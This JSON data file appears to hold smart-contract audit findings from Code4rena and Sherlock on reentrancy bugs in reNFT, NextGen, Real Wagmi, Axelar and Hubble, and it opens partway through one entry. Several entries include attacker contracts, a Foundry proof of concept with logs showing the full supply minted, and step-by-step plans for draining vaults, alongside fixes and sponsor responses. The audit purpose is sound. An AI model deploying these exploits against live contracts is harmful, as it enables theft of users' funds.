onERC1155Received(\n            address,\n            address,\n            uint256,\n            uint256,\n            bytes calldata\n        ) external returns(bytes4) {\n\n            _transferHijackedTokensToOwner();\n\n            return 0xf23a6e61;\n        }\n\n        function _transferHijackedTokensToOwner() internal returns(bool) {\n\n            SafeUtils.executeTransaction(\n                address(safe),\n                address(tokenToHijack),\n                maliciousSafeTransaction,\n                maliciousSafeTransactionSignature\n            );\n\n            return true;\n\n        }\n\n        function setSafeAddr(address _safe) external onlyOwner {\n            safe = _safe;\n        }\n\n        function setTokenToHijackAddr(address _tokenAddr) external onlyOwner {\n            tokenToHijack = _tokenAddr;\n        }\n\n        function setSignatureAndTransaction(bytes memory _signature, bytes memory _transaction) external onlyOwner {\n            maliciousSafeTransactionSignature = _signature;\n            maliciousSafeTransaction = _transaction;\n        }\n\n        modifier onlyOwner {\n            require(msg.sender == owner);\n            _;\n        }\n\n    }\n\n</details>\n\n***\n\n### Impact\n\n***\n\nAn attacker can hijack any ERC1155 token he rents, and the lender won't be able to get the rental funds he should get after rental expiry.\n\n***\n\n### Remediation\n\n***\n\nThe main problem is that the token transferral occurs before the rental is registered, so the fix I propose is that the lender's ERC1155 tokens be transferred first to a trusted contract which registers the rental and then the trusted contract sends the ERC1155 tokens to the borrower's rental safe after ensuring the rental was registered. This fix would break this exploit.\n\n***\n\n**[0xean (Judge) commented](https://github.com/code-423n4/2024-01-renft-findings/issues/588#issuecomment-1917191218):**\n > > In short, the main issue is that https://github.com/code-423n4/2024-01-renft-findings/issues/593 doesn't validate the address supplied to setFallbackHandler as it should, and the main issue with this reported bug is that tokens are transferred directly to the rental safe prior to being registered.\n> \n> I think this is correct and why these issues should remain distinct.  Currently my point of view is:\n> \n> 1) fixing the guard is required\n> 2) fixing the ability to interact before the token is registered is also required\n> \n> 2 fixes, 2 issues.  Would welcome one last comment from @0xA5DF prior to calling this final\n\n**[Alec1017 (reNFT) confirmed and commented](https://github.com/code-423n4/2024-01-renft-findings/issues/588#issuecomment-1917288429):**\n > Totally agree with @0xean that these are 2 distinct issues\n\n_Note: To see full discussion, see [here](https://github.com/code-423n4/2024-01-renft-findings/issues/588)._\n\n**[reNFT mitigated](https://github.com/code-423n4/2024-02-renft-mitigation?tab=readme-ov-file#mitigations-to-be-reviewed):**\n> The PR [here](https://github.com/re-nft/smart-contracts/pull/14) - Introduces an intermediary transfer on rental creation to ensure assets are not sent to the safe until they have been registered as rented by the protocol.\n\n**Status:** Mitigation confirmed. Full details in reports from [EV_om](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/43), [sin1st3r__](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/32) and [juancito](https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/4).\n\n***\n\n",
      "summary": "\nA Gnosis Safe Fallback Handler is a contract that handles unknown functions for a safe. This feature allows for more flexibility for the user. The bug is that when transferring ERC1155 tokens, the fallback handler is not aware of the rental, allowing an attacker to hijack the tokens by creating a custom fallback handler that instructs the safe to transfer the tokens to the attacker's address. To run a proof of concept, follow the steps outlined in the report.",
      "report_date": {},
      "contest_prize_txt": "83600",
      "contest_link": "https://code4rena.com/reports/2024-01-renft",
      "sponsor_name": "reNFT",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2024-01-renft",
      "github_link": "https://github.com/code-423n4/2024-01-renft-findings/issues/588",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "317",
      "slug": "h-03-an-attacker-can-hijack-any-erc1155-token-he-rents-due-to-a-design-issue-in-renft-via-reentrancy-exploitation-code4rena-renft-renft-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "reNFT",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "reNFT",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "NFT Lending"
            },
            "score": 1391.208791137663
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        },
        {
          "tags_tag": {
            "title": "ERC1155"
          }
        }
      ]
    },
    {
      "id": "29522",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 80,
      "protocol_id": "1143",
      "title": "[H-01] Attacker can reenter to mint all the collection supply",
      "content": "\nAn attacker can reenter the `MinterContract::mint` function, bypassing the `maxCollectionPurchases` check and minting the entire collection supply.\n\n### Proof of Concept\n\nThe vulnerability stems from the absence of the [Check Effects Interactions](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html) pattern. As seen here, `NextGenCore::mint` updates the `tokensMintedAllowlistAddress` and `tokensMintedPerAddress` after making an external call:\n\n```solidity\n    // Minting logic is here\n    if (phase == 1) {\n        tokensMintedAllowlistAddress[_collectionID][_mintingAddress]++;\n    } else {\n        tokensMintedPerAddress[_collectionID][_mintingAddress]++;\n    }\n}\n```\n\n### Exploitation Steps:\n\n- Attacker calls `MinterContract::mint` with a malicious contract as the receiver.\n- The malicious contract executes a crafted `onERC721Received()`.\n- `MinterContract::mint` invokes `NextGenCore::mint`, which uses `_safeMint()` internally.\n- `_safeMint()` calls `_recipient.onERC721Received()`, leading to the minting of the complete collection supply.\n\n### An example of the attacker `onERC721Received()` implementation:\n\n```solidity\n    function onERC721Received(\n        address,\n        address,\n        uint256,\n        bytes memory\n    ) public override returns (bytes4) {\n        (, , uint256 circulationSupply, uint256 totalSupply, , ) = nextGenCore\n            .retrieveCollectionAdditionalData(1);\n\n        if (circulationSupply == totalSupply)\n            return this.onERC721Received.selector;\n\n        bytes32[] memory merkleProof = new bytes32[](1);\n        merkleProof[0] = bytes32(0);\n        minterContract.mint{value: 1e18}({\n            _collectionID: 1,\n            _numberOfTokens: 1,\n            _maxAllowance: 0,\n            _tokenData: \"\",\n            _mintTo: address(this),\n            merkleProof: merkleProof,\n            _delegator: address(0),\n            _saltfun_o: 0\n        });\n\n        return this.onERC721Received.selector;\n    }\n```\n\n### Here is a coded PoC to demonstrate the issue:\n\n```solidity\n    function testMintAllTheCollection() public {\n        bytes32[] memory merkleProof = setUpArrayBytes(1);\n        merkleProof[0] = bytes32(0);\n\n        address attacker = makeAddr(\"attacker\");\n\n        vm.prank(attacker);\n        MintAllSupply mintAllSupply = new MintAllSupply(minterContract, nextGenCore);\n\n        deal(address(mintAllSupply), 49e18);\n\n        vm.warp(block.timestamp + 1 days);\n\n        console.log(\"(Collection Circulation Supply Before)      = \", nextGenCore.viewCirSupply(1));\n        console.log(\"(Balance of attacker contract Before)       = \", address(mintAllSupply).balance);\n        console.log(\"(Col 1 Balance of attacker contract Before) = \", nextGenCore.balanceOf(address(mintAllSupply)));\n\n        hoax(attacker, 1e18);\n        minterContract.mint{ value: 1e18}({\n            _collectionID: 1,\n            _numberOfTokens: 1,\n            _maxAllowance: 0,\n            _tokenData: \"\",\n            _mintTo: address(mintAllSupply),\n            merkleProof: merkleProof,\n            _delegator: address(0),\n            _saltfun_o: 0\n        });\n\n        console.log(\"(Collection Circulation Supply After)       = \", nextGenCore.viewCirSupply(1));\n        console.log(\"(Balance of attacker contract After)        = \", address(mintAllSupply).balance);\n        console.log(\"(Col 1 Balance of attacker contract After)  = \", nextGenCore.balanceOf(address(mintAllSupply)));\n    }\n```\n\n### Logs result:\n\n```yaml\n  (Collection Circulation Supply Before)      :  0\n  (Balance of attacker contract Before)       :  49000000000000000000\n  (Col 1 Balance of attacker contract Before) :  0\n  (Collection Circulation Supply After)       :  50\n  (Balance of attacker contract After)        :  0\n  (Col 1 Balance of attacker contract After)  :  50\n```\n\n### Test Setup:\n\n- Clone the repository: <https://github.com/0xbtk/NextGen-Setup.git>.\n- Add the attacker's contract in the Helpers folder from this [link](https://gist.github.com/0xbtk/57496ae3761917c2f0e9f6ac3d23c300#file-mintallsupply-sol).\n- Incorporate the tests in `NextGenSecurityReview`.\n- Execute: `forge test --mt testMintAllTheCollection -vvv`.\n\n### Recommended Mitigation Steps\n\nWe recommend following [Check Effects Interactions](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html) in `NextGenCore::mint` as follow:\n\n```solidity\n    if (phase == 1) {\n        tokensMintedAllowlistAddress[_collectionID][_mintingAddress]++;\n    } else {\n        tokensMintedPerAddress[_collectionID][_mintingAddress]++;\n    }\n    // Minting logic should be here\n}\n```\n\n### Assessed type\n\nReentrancy\n\n**[a2rocket (NextGen) confirmed via duplicate issue #51](https://github.com/code-423n4/2023-10-nextgen-findings/issues/51#issuecomment-1822678898)**\n\n**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1517#issuecomment-1839451072):**\n > The Warden has illustrated how a re-entrant EIP-721 hook can be exploited to bypass the allowlist/public limitations set forth for a collection.\n> \n> The Sponsor has confirmed the finding and I deem it valid as the code will update the minted per address mappings **after the \"safe\" mint operation**, thereby being susceptible to the re-entrancy described. Its severity of \"high\" is also deemed correct given that a main invariant of the system (mint limitations so scarcity of an NFT) can be broken arbitrarily as the re-entrancy attack can be repetitively replayed.\n> \n> The Warden's submission was selected as the best due to its correct remediation relying on enforcement of the CEI pattern, short-and-sweet PoC, and overall clean submission.\n\n**[0xsomeone (judge) commented](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1517#issuecomment-1847710278):**\n > After discussions with fellow judges, I have opted to split re-entrancy vulnerabilities into two separate instances:\n> \n> - Absence of the CEI Pattern in [`NextGenCore::mint`](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L193-L199)\n> - Absence of the CEI Pattern in [`MinterContract::mint`](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L234-L253)\n> \n> In my opinion, those two constitute different vulnerabilities as they relate to different state variables. The rationale behind this \"split\" is that when we consider the root cause for a vulnerability to render two submissions distinct, we have to treat a re-entrancy as a desirable trait of the EVM. Additionally, we cannot assume a rational fix is the application of the `ReentrancyGuard::nonReentrant` modifier; **the enforcement of the CEI pattern** is widely recognized as the \"correct\" way to resolve these issues.\n> \n> This assumption falls in line with what the Solidity documentation has **instructed since its inception**, given that the security considerations of the language clearly state that the CEI pattern [should be applied and do not mention \"re-entrancy\" guards](https://docs.soliditylang.org/en/v0.8.23/security-considerations.html#reentrancy). As such, the root causes described in this issue are two unique ones: \n> \n> - [#1517](https://github.com/code-423n4/2023-10-nextgen-findings/issues/1517): Absence of the CEI Pattern in [`NextGenCore::mint`](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/NextGenCore.sol#L193-L199)\n> - [#2048](https://github.com/code-423n4/2023-10-nextgen-findings/issues/2048): Absence of the CEI Pattern in [`MinterContract::mint`](https://github.com/code-423n4/2023-10-nextgen/blob/main/smart-contracts/MinterContract.sol#L234-L253)\n> \n> EDIT: After further consideration, I have opted to retain only this submission as a valid of the two.\n> \n> The absence of the CEI pattern in #2048 leads to an incorrect `getPrice` being utilized for multiple **valid** mints in a period, and no Warden identified that particular aspect that is vulnerable. As such, I have proceeded to invalidate the submission and its duplicates.\n\n***\n\n",
      "summary": "\nThis bug report discusses a vulnerability in the NextGen smart contract that allows an attacker to mint the entire collection supply. The vulnerability is caused by the absence of the Check Effects Interactions pattern, which leads to the update of certain variables after making an external call. This allows the attacker to use a malicious contract to execute a crafted function and bypass the maximum collection purchases check. The report includes a proof of concept and steps for exploitation, as well as a recommended mitigation step to implement the Check Effects Interactions pattern in the affected function. The severity of this vulnerability is considered high, and it has been confirmed by the project team and judges. ",
      "report_date": {},
      "contest_prize_txt": "60500",
      "contest_link": "https://code4rena.com/reports/2023-10-nextgen",
      "sponsor_name": "NextGen",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2023-10-nextgen",
      "github_link": "https://github.com/code-423n4/2023-10-nextgen-findings/issues/1517",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "302",
      "slug": "h-01-attacker-can-reenter-to-mint-all-the-collection-supply-code4rena-nextgen-nextgen-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "NextGen",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "NextGen",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "27395",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "HIGH",
      "finders_count": 1,
      "protocol_id": "1114",
      "title": "H-2: Adversary can reenter takeOverDebt() during liquidation to steal vault funds",
      "content": "Source: https://github.com/sherlock-audit/2023-10-real-wagmi-judging/issues/76 \n\n## Found by \n0x52\n\nDue to the lack of nonReentrant modifier on takeOverDebt() a liquidatable position can be both liquidated and transferred simultaneously. This results in LPs being repaid from the vault while the position and loans continue to be held open, effectively duplicating the liquidated position. LPs therefore get to 'double dip' from the vault, stealing funds and causing a deficit. This can be abused by an attacker who borrows against their own LP to exploit the 'double dip' for profit.\n\n## Vulnerability Detail\n\nFirst we'll walk through a high level breakdown of the issue to have as context for the rest of the report:\n\n 1) Create a custom token that allows them to take control of the transaction and to prevent liquidation\n 2) Fund UniV3 LP with target token and custom token\n 3) Borrow against LP with target token as the hold token\n 4) After some time the position become liquidatable\n 5) Begin liquidating the position via repay()\n 6) Utilize the custom token during the swap in repay() to gain control of the transaction\n 7) Use control to reenter into takeOverDebt() since it lack nonReentrant modifier\n 8) Loan is now open on a secondary address and closed on the initial one\n 8) Transaction resumes (post swap) on repay() \n 9) Finish repayment and refund all initial LP\n10) Position is still exists on new address\n11) After some time the position become liquidatable\n12) Loan is liquidated and attacker is paid more LP\n13) Vault is at a deficit due to refunding LP twice\n14) Repeat until the vault is drained of target token\n\n[LiquidityManager.sol#L279-L287](https://github.com/sherlock-audit/2023-10-real-wagmi/blob/main/wagmi-leverage/contracts/abstract/LiquidityManager.sol#L279-L287)\n\n    _v3SwapExactInput(\n        v3SwapExactInputParams({\n            fee: params.fee,\n            tokenIn: cache.holdToken,\n            tokenOut: cache.saleToken,\n            amountIn: holdTokenAmountIn,\n            amountOutMinimum: (saleTokenAmountOut * params.slippageBP1000) /\n                Constants.BPS\n        })\n\nThe control transfer happens during the swap to UniV3. Here when the custom token is transferred, it gives control back to the attacker which can be used to call takeOverDebt().\n\n[LiquidityBorrowingManager.sol#L667-L672](https://github.com/sherlock-audit/2023-10-real-wagmi/blob/main/wagmi-leverage/contracts/LiquidityBorrowingManager.sol#L667-L672)\n\n        _removeKeysAndClearStorage(borrowing.borrower, params.borrowingKey, loans);\n        // Pay a profit to a msg.sender\n        _pay(borrowing.holdToken, address(this), msg.sender, holdTokenBalance);\n        _pay(borrowing.saleToken, address(this), msg.sender, saleTokenBalance);\n\n        emit Repay(borrowing.borrower, msg.sender, params.borrowingKey);\n\nThe reason the reentrancy works is because the actual borrowing storage state isn't modified until AFTER the control transfer. This means that the position state is fully intact for the takeOverDebt() call, allowing it to seamlessly transfer to another address behaving completely normally. After the repay() call resumes, _removeKeysAndClearStorage is called with the now deleted borrowKey. \n\n[Keys.sol#L31-L42](https://github.com/sherlock-audit/2023-10-real-wagmi/blob/main/wagmi-leverage/contracts/libraries/Keys.sol#L31-L42)\n\n    function removeKey(bytes32[] storage self, bytes32 key) internal {\n        uint256 length = self.length;\n        for (uint256 i; i < length; ) {\n            if (self.unsafeAccess(i).value == key) {\n                self.unsafeAccess(i).value = self.unsafeAccess(length - 1).value;\n                self.pop();\n                break;\n            }\n            unchecked {\n                ++i;\n            }\n        }\n\nThe unique characteristic of deleteKey is that it doesn't revert if the key doesn't exist. This allows \"removing\" keys from an empty array without reverting. This allows the repay call to finish successfully.\n\n[LiquidityBorrowingManager.sol#L450-L452](https://github.com/sherlock-audit/2023-10-real-wagmi/blob/main/wagmi-leverage/contracts/LiquidityBorrowingManager.sol#L450-L452)\n\n        //newBorrowing.accLoanRatePerSeconds = oldBorrowing.accLoanRatePerSeconds;\n        _pay(oldBorrowing.holdToken, msg.sender, VAULT_ADDRESS, collateralAmt + feesDebt);\n        emit TakeOverDebt(oldBorrowing.borrower, msg.sender, borrowingKey, newBorrowingKey);\n\nNow we can see how this creates a deficit in the vault. When taking over an existing debt, the user is only required to provide enough hold token to cover any fee debt and any additional collateral to pay fees for the newly transferred position. This means that the user isn't providing any hold token to back existing LP.\n\n[LiquidityBorrowingManager.sol#L632-L636](https://github.com/sherlock-audit/2023-10-real-wagmi/blob/main/wagmi-leverage/contracts/LiquidityBorrowingManager.sol#L632-L636)\n\n            Vault(VAULT_ADDRESS).transferToken(\n                borrowing.holdToken,\n                address(this),\n                borrowing.borrowedAmount + liquidationBonus\n            );\n\nOn the other hand repay transfers the LP backing funds from the vault. Since the same position is effectively liquidated twice, it will withdraw twice as much hold token as was originally deposited and no new LP funds are added when the position is taken over. This causes a deficit in the vault since other users funds are being withdrawn from the vault.\n\n## Impact\n\nVault can be drained\n\n## Code Snippet\n\n[LiquidityBorrowingManager.sol#L395-L453](https://github.com/sherlock-audit/2023-10-real-wagmi/blob/main/wagmi-leverage/contracts/LiquidityBorrowingManager.sol#L395-L453)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAdd the `nonReentrant` modifier to `takeOverDebt()`\n\n\n\n## Discussion\n\n**fann95**\n\nUnfortunately, during development, we lost the nonReentrant-modifier just like checkDeadline. We will fix it.\n\n**fann95**\n\nFixed: https://github.com/RealWagmi/wagmi-leverage/commit/955d742c37736192f81a20c39a82324f3d711fb4",
      "summary": "\nThis bug report is about the lack of a nonReentrant modifier on the takeOverDebt() function in the LiquidityManager.sol contract, which allows for the duplication of a liquidatable position. This results in Liquidity Providers (LPs) being repaid from the vault while the position and loans continue to be held open, effectively stealing funds from the vault and causing a deficit. An attacker can exploit this vulnerability by borrowing against their own LP to gain a profit. \n\nThe control transfer happens during the swap to UniV3, when the custom token is transferred, it gives control back to the attacker which can be used to call takeOverDebt(). The reason the reentrancy works is because the actual borrowing storage state isn't modified until AFTER the control transfer. This means that the position state is fully intact for the takeOverDebt() call, allowing it to seamlessly transfer to another address behaving completely normally. After the repay() call resumes, _removeKeysAndClearStorage is called with the now deleted borrowKey. \n\nWhen taking over an existing debt, the user is only required to provide enough hold token to cover any fee debt and any additional collateral to pay fees for the newly transferred position. This means that the user isn't providing any hold token to back existing LP. On the other hand repay transfers the LP backing funds from the vault. Since the same position is effectively liquidated twice, it will withdraw twice as much hold token as was originally deposited and no new LP funds are added when the position is taken over. This causes a deficit in the vault since other users funds are being withdrawn from the vault.\n\nThe impact of this bug is that the vault can be drained. The code snippet provided is from the LiquidityBorrowingManager.sol#L395-L453. The tool used to find this bug was manual review. The recommendation to fix this bug is to add the nonReentrant modifier to takeOverDebt(). The bug has since been fixed in the commit 955d742c37736192f81a20c39a82324f3d711fb4.",
      "report_date": {},
      "contest_prize_txt": "27500 USDC",
      "contest_link": "https://app.sherlock.xyz/audits/contests/118",
      "sponsor_name": "",
      "sponsor_link": "",
      "quality_score": 5,
      "general_score": 5,
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-10-real-wagmi-judging/issues/76",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "118",
      "slug": "h-2-adversary-can-reenter-takeoverdebt-during-liquidation-to-steal-vault-funds-sherlock-real-wagmi-2-git",
      "firm_name": "Sherlock",
      "firm_logo_square": "sherlock_square.png",
      "protocol_name": "Real Wagmi #2",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Sherlock",
        "logo_square": "sherlock_square.png"
      },
      "protocols_protocol": {
        "name": "Real Wagmi #2",
        "protocols_protocolcategoryscore": []
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "28760",
      "kind": "GIT",
      "auditfirm_id": "2",
      "impact": "HIGH",
      "finders_count": 2,
      "protocol_id": "937",
      "title": "[H-02] ERC777 and similar token implementations allow a stealing of funds when transferring tokens",
      "content": "\nA malicious actor can trick a `TokenManager` into thinking that a bigger amount of tokens were transferred. On the destination chain, the malicious actor will be able to receive more tokens than they sent on the source chain.\n\n### Proof of Concept\n\n[TokenManagerLockUnlock](https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/token-manager/implementations/TokenManagerLockUnlock.sol#L16) and [TokenManagerLiquidityPool](https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/token-manager/implementations/TokenManagerLiquidityPool.sol#L17) are `TokenManager` implementations that transfer tokens from/to users when sending tokens cross-chain. The low-level `_takeToken` function ([TokenManagerLiquidityPool.\\_takeToken](https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/token-manager/implementations/TokenManagerLiquidityPool.sol#L77), [TokenManagerLockUnlock.\\_takeToken](https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/token-manager/implementations/TokenManagerLockUnlock.sol#L44)) is used to take tokens from a user on the source chain before emitting a cross-chain message, e.g. via the [TokenManager.sendToken](https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/token-manager/TokenManager.sol#L83) function. The function computes the difference in the balance of the liquidity pool or the token manager before and after the transfer, to track the actual amount of tokens transferred. The amount is then [passed in the cross-chain message](https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/token-manager/TokenManager.sol#L90-L99) to tell the `InterchainTokenService` contract on the destination chain [how many tokens to give to the recipient](https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token-service/InterchainTokenService.sol#L610).\n\nThe `_takeToken` function, however, is not protected from reentrance, which opens up the following attack scenario:\n\n1. A malicious contract initiates transferring of 100 ERC777 tokens by calling [TokenManager.sendToken](https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/token-manager/TokenManager.sol#L83).\n\n2. The `_takeToken` function calls `transferFrom` on the ERC777 token contract, which calls the [tokensToSend](https://eips.ethereum.org/EIPS/eip-777#erc777tokenssender-and-the-tokenstosend-hook) hook on the malicious contract (the sender).\n\n3. In the hook, the malicious contract makes another call to `TokenManager.sendToken` and sends 100 more tokens.\n\n4. In the nested `_takeToken` call, the balance change will equal 100 since, in ERC777, the balance state is updated only after the `tokensToSend` hook, so only the re-entered token transfer will be counted.\n\n5. The re-entered call to `TokenManager.sendToken` will result in 100 tokens transferred cross-chain.\n\n6. In the first `_takeToken` call, the balance change will equal 200 because the balance of the receiver will increase twice during the `transferFrom` call; once for the first call and once for the re-entered call.\n\n7. As a result, the malicious contract will transfer 100+100 = 200 tokens, but the `TokenManager` contract will emit two cross-chain messages; one will transfer 100 tokens (the re-entered call) and the other will transfer 200 tokens (the first call). This will let the malicious actor to receive 300 tokens on the destination chain, while spending only 200 tokens on the source chain.\n\nSince the protocol is expected to support different implementations of ERC20 tokens, including custom ones, the attack scenario is valid for any token implementation that uses hooks during transfers.\n\n### Recommended Mitigation Steps\n\nConsider adding re-entrancy protection to the `TokenManagerLiquidityPool._takeToken` and `TokenManagerLockUnlock._takeToken` functions, for example by using the [ReentrancyGuard](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master) from OpenZeppelin.\n\n### Assessed type\n\nReentrancy\n\n**[deanamiel (Axelar) confirmed and commented](https://github.com/code-423n4/2023-07-axelar-findings/issues/317#issuecomment-1693739752):**\n> We have added a separate token manager for fee on transfer tokens, which is protected from reentrancy.\n>\n> Link to the public PR: https://github.com/axelarnetwork/interchain-token-service/pull/96.\n\n***\n \n",
      "summary": "\nThis bug report is about a malicious actor being able to trick a TokenManager into thinking a bigger amount of tokens were transferred than actually sent on the source chain. This is due to the low-level _takeToken function not being protected from reentrancy. The malicious actor can call the TokenManager.sendToken function and then in the tokensToSend hook, make another call to TokenManager.sendToken. This will result in the malicious actor receiving more tokens on the destination chain than they sent on the source chain.\n\nTo mitigate this, it is recommended to add re-entrancy protection to the TokenManagerLiquidityPool._takeToken and TokenManagerLockUnlock._takeToken functions, for example by using the ReentrancyGuard from OpenZeppelin. This has been confirmed and commented on by deanamiel (Axelar), who has added a separate token manager for fee on transfer tokens which is protected from reentrancy.",
      "report_date": {},
      "contest_prize_txt": "80000",
      "contest_link": "https://code4rena.com/reports/2023-07-axelar",
      "sponsor_name": "Axelar Network",
      "sponsor_link": "",
      "quality_score": 0,
      "general_score": 0,
      "source_link": "https://code4rena.com/reports/2023-07-axelar",
      "github_link": "https://github.com/code-423n4/2023-07-axelar-findings/issues/317",
      "pdf_link": "",
      "pdf_page_from": 0,
      "contest_id": "260",
      "slug": "h-02-erc777-and-similar-token-implementations-allow-a-stealing-of-funds-when-transferring-tokens-code4rena-axelar-network-axelar-network-git",
      "firm_name": "Code4rena",
      "firm_logo_square": "code4rena_square.png",
      "protocol_name": "Axelar Network",
      "bookmarked": false,
      "read": false,
      "auditfirms_auditfirm": {
        "name": "Code4rena",
        "logo_square": "code4rena_square.png"
      },
      "protocols_protocol": {
        "name": "Axelar Network",
        "protocols_protocolcategoryscore": [
          {
            "protocols_protocolcategory": {
              "title": "Dexes"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Bridge"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Services"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "Cross Chain"
            },
            "score": 0.5
          },
          {
            "protocols_protocolcategory": {
              "title": "RWA"
            },
            "score": 0.5
          }
        ]
      },
      "issues_issuetagscore": [
        {
          "tags_tag": {
            "title": "Reentrancy"
          }
        }
      ]
    },
    {
      "id": "20692",
      "kind": "GIT",
      "auditfirm_id": "3",
      "impact": "MEDIUM",
      "finders_count": 2,
      "protocol_id": "975",
      "title": "M-7: Malicious user can grief withdrawing users via VUSD reentrancy",
      "content": "Source: https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/153 \n\n## Found by \n0x3e84fa45, 0x52\n## Summary\n\nVUSD#processWithdraw makes a call to withdrawal.usr to send the withdrawn gas token. processWithdrawals is the only nonreentrant function allowing a user to create a smart contract that uses it's receive function to deposit then immediately withdraw to indefinitely lengthen the withdrawal queue and waste large amounts of caller gas.\n\n## Vulnerability Detail\n\n[VUSD.sol#L69-L77](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/VUSD.sol#L69-L77)\n\n        while (i < withdrawals.length && (i - start) < maxWithdrawalProcesses) {\n            Withdrawal memory withdrawal = withdrawals[i];\n            if (reserve < withdrawal.amount) {\n                break;\n            }\n\n            (bool success, bytes memory data) = withdrawal.usr.call{value: withdrawal.amount}(\"\");\n            if (success) {\n                reserve -= withdrawal.amount;\n\nTo send the withdrawn gas token to the user VUSD#processWithdrawals utilizes a call with no data. When received by a contract this will trigger it's receive function. This can be abused to continually grief users who withdraw with no recurring cost to the attacker. To exploit this the attacker would withdraw VUSD to a malicious contract. This contract would deposit the received gas token then immediately withdraw it. This would lengthen the queue. Since the queue is first-in first-out a user would be forced to process all the malicious withdrawals before being able to process their own. While processing them they would inevitably reset the grief for the next user.\n\nNOTE: I am submitting this as a separate issue apart from my other two similar issues. I believe it should be a separate issue because even though the outcome is similar the root cause is entirely different. Those are directly related to the incorrect call parameters while the root cause of this issue is that both mintWithReserve and withdraw/withdrawTo lack the reentrant modifier allowing this malicious reentrancy.\n\n## Impact\n\nMalicious user can maliciously reenter VUSD to grief users via unnecessary gas wastage \n\n## Code Snippet\n\n[VUSD.sol#L45-L48](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/VUSD.sol#L45-L48)\n\n[VUSD.sol#L50-L52](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/VUSD.sol#L50-L52)\n\n[VUSD.sol#L58-L60](https://github.com/sherlock-audit/2023-04-hubble-exchange/blob/main/hubble-protocol/contracts/VUSD.sol#L58-L60)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAdd the nonreentrant modifer to mintWithReserve withdraw and withdrawTo\n\n\n\n## Discussion\n\n**asquare08**\n\nWill add the `nonreentrant` modifer to `mintWithReserve` withdraw and `withdrawTo`\n\n**ctf-sec**\n\n>To exploit this the attacker would withdraw VUSD to a malicious contract. This contract would deposit the received gas token then immediately withdraw it. \n\nI put this issue and #160 together because these two issue highlight different ways of wasting gas, but they also focus on how to waste gas in external call.\n\nRecommend checking #160 as well.\n\nand I leave the #158 as a separate issue because the root cause is the returned call data is emitted in the contract code itself\n\n**asquare08**\n\nyes noted. #160 has slightly different cause but same effect. So the solution for all these related issues is\n* don't save data in variable #158 \n* cap the gas limit of .call #160\n* [this](https://github.com/sherlock-audit/2023-04-hubble-exchange-judging/issues/153#issuecomment-1640346418)\n\n\n**IAm0x52**\n\nEscalate\n\nAs the sponsor has pointed out, this is a different issue from the dupes. While the outcome of wasting gas is similar, the root cause is completely different. The root cause for this is reentrancy across functions, while the root cause of issues marked as dupes is that there is no gas limit. I suggest that this issue be separated and the dupes groped together as separate issues.\n\nEdit:\nMissed #195. That and this should be considered a separate issue\n\n**sherlock-admin2**\n\n > Escalate\n> \n> As the sponsor has pointed out, this is a different issue from the dupes. While the outcome of wasting gas is similar, the root cause is completely different. The root cause for this is 